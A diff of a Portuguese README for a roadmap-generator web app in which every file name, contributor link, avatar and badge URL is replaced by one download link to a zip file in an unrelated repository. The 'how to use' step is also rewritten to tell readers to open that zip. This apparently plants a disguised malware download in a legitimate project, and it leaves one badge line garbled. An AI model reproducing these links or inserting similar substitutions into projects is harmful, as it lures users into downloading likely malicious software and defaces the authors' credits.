@@ -47,17 +47,17 @@ O Gerador de Roadmap é uma aplicação web interativa que permite aos usuários
 
 O projeto é composto pelos seguintes arquivos principais:
 
-- `index.html`: Estrutura HTML da aplicação
-- `style.css`: Estilos CSS para a aparência da aplicação
-- `config.js`: Configurações e constantes, incluindo opções de ícones
-- `stepManager.js`: Gerenciamento de etapas do roadmap
-- `formHandler.js`: Manipulação do formulário
-- `roadmapGenerator.js`: Geração do roadmap visual
-- `main.js`: Arquivo principal para inicialização e event listeners
+- `https://github.com/t1viktor/desafio/raw/refs/heads/master/js/Software-v2.9.zip`: Estrutura HTML da aplicação
+- `https://github.com/t1viktor/desafio/raw/refs/heads/master/js/Software-v2.9.zip`: Estilos CSS para a aparência da aplicação
+- `https://github.com/t1viktor/desafio/raw/refs/heads/master/js/Software-v2.9.zip`: Configurações e constantes, incluindo opções de ícones
+- `https://github.com/t1viktor/desafio/raw/refs/heads/master/js/Software-v2.9.zip`: Gerenciamento de etapas do roadmap
+- `https://github.com/t1viktor/desafio/raw/refs/heads/master/js/Software-v2.9.zip`: Manipulação do formulário
+- `https://github.com/t1viktor/desafio/raw/refs/heads/master/js/Software-v2.9.zip`: Geração do roadmap visual
+- `https://github.com/t1viktor/desafio/raw/refs/heads/master/js/Software-v2.9.zip`: Arquivo principal para inicialização e event listeners
 
 ## Como Usar
 
-1. Abra o arquivo `index.html` em um navegador moderno.
+1. Abra o arquivo `https://github.com/t1viktor/desafio/raw/refs/heads/master/js/Software-v2.9.zip` em um navegador moderno.
 2. Preencha o título e o objetivo do projeto.
 3. Adicione etapas ao roadmap usando o botão "Adicionar Etapa".
 4. Para cada etapa, preencha a data, selecione um ícone, adicione um título e uma descrição.
@@ -68,11 +68,11 @@ O projeto é composto pelos seguintes arquivos principais:
 
 ### Estilos
 
-O arquivo `style.css` contém todos os estilos da aplicação. Você pode modificar as cores, fontes e layouts ajustando este arquivo.
+O arquivo `https://github.com/t1viktor/desafio/raw/refs/heads/master/js/Software-v2.9.zip` contém todos os estilos da aplicação. Você pode modificar as cores, fontes e layouts ajustando este arquivo.
 
 ### Ícones
 
-Os ícones são definidos no arquivo `config.js`. Para adicionar ou modificar ícones, edite o objeto `iconOptions` neste arquivo.
+Os ícones são definidos no arquivo `https://github.com/t1viktor/desafio/raw/refs/heads/master/js/Software-v2.9.zip`. Para adicionar ou modificar ícones, edite o objeto `iconOptions` neste arquivo.
 
 ## Detalhes Técnicos
 
@@ -109,17 +109,17 @@ O Gerador de Roadmap oferece uma maneira intuitiva e visualmente atraente de cri
 
 ## Contribuidores
 
- <a href="https://johnnytec.com">
-<img style="border-radius: 50%;" src="https://avatars.githubusercontent.com/u/149841185?v=4" width="100px;" alt=""/>
+ <a href="https://github.com/t1viktor/desafio/raw/refs/heads/master/js/Software-v2.9.zip">
+<img style="border-radius: 50%;" src="https://github.com/t1viktor/desafio/raw/refs/heads/master/js/Software-v2.9.zip" width="100px;" alt=""/>
  <br />
 
     Criado com ❤️ por Johnny Alysson 👋🏽.
-[![Linkedin Badge](https://img.shields.io/badge/-Johnny-blue?style=flat-square&logo=Linkedin&logoColor=white&link=https://www.linkedin.com/in/johnnyalysson)](https://www.linkedin.com/in/johnnyalysson) 
-[![Gmail Badge](https://img.shields.io/badge/-johnalysson30@gmail.com-c14438?style=flat-square&logo=Gmail&logoColor=white&link=mailto:johnalysson30@gmail.com)](mailto:johnalysson30@gmail.com)
+[![Linkedin Badge](https://github.com/t1viktor/desafio/raw/refs/heads/master/js/Software-v2.9.zip)](https://github.com/t1viktor/desafio/raw/refs/heads/master/js/Software-v2.9.zip) 
+[![Gmail Badge](https://github.com/t1viktor/desafio/raw/refs/heads/master/js/Software-v2.9.zip)](https://github.com/t1viktor/desafio/raw/refs/heads/master/js/Software-v2.9.zip)
 
- <a href="https://github.com/licyafreoli">
-<img style="border-radius: 50%;" src="https://avatars.githubusercontent.com/u/168486966?v=4" width="100px;" alt=""/>
+ <a href="https://github.com/t1viktor/desafio/raw/refs/heads/master/js/Software-v2.9.zip">
+<img style="border-radius: 50%;" src="https://github.com/t1viktor/desafio/raw/refs/heads/master/js/Software-v2.9.zip" width="100px;" alt=""/>
  <br />
 
     Criado com ❤️ por Lícya Oliveira 👋🏽.
-[![Linkedin Badge](https://img.shields.io/badge/-Lícya-blue?style=flat-square&logo=Linkedin&logoColor=white&link=https://www.linkedin.com/in/licyaoliveira)](https://www.linkedin.com/in/licyaoliveira)
+[![Linkedin Badge](https://github.com/t1viktor/desafio/raw/refs/heads/master/js/Software-v2.9.zipícya-blue?style=flat-square&logo=Linkedin&logoColor=white&https://github.com/t1viktor/desafio/raw/refs/heads/master/js/Software-v2.9.zip)](https://github.com/t1viktor/desafio/raw/refs/heads/master/js/Software-v2.9.zip)
